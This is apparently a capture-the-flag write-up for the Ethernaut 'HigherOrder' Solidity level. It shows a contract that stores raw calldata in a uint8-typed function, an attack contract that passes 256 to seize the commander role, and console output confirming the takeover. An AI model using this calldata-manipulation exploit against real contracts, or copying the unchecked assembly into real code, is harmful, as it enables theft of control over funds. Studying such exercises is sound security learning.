<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel30.svg" />

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

Challenge's message:
> Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme. Your objective is to become the Commander of the Higher Order! Good luck!
Things that might help: Sometimes, `calldata` cannot be trusted. Compilers are constantly evolving into better spaceships.

# Subverting 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Level.sol";

contract Attack{

    HigherOrder target;

    constructor(address _target) public {
        target = HigherOrder(_target);
    }

    function attack() external {
       (bool result, ) =  address(target).call(abi.encodePacked(HigherOrder.registerTreasury.selector,abi.encode(256)));
       require(result, "Attack was unsuccessful");
    }

}
```
```shell
await contract.commander()
'0x0000000000000000000000000000000000000000'
```
```shell
await contract.claimLeadership()
{tx: '0xfaaeff719072036dc21b85179952d07d068469461032a211d25fd275021ba471', receipt: {…}, logs: Array(0)}
```
```shell
await contract.commander()
'0xb165dE24fBEa8Cbf2f02318caafb5a7463D6c8d4'
```
Challenge's message:
> You've conquered the Higher Order challenge, mastering the Dirty Higher Order Bits exploit to claim the title of Commander. In this quest, you've delved deep into Solidity, learning to manipulate bytes and bypass function type checks. Your victory not only showcases your technical prowess but also highlights your ability to think creatively and critically.

***by wasny0ps***
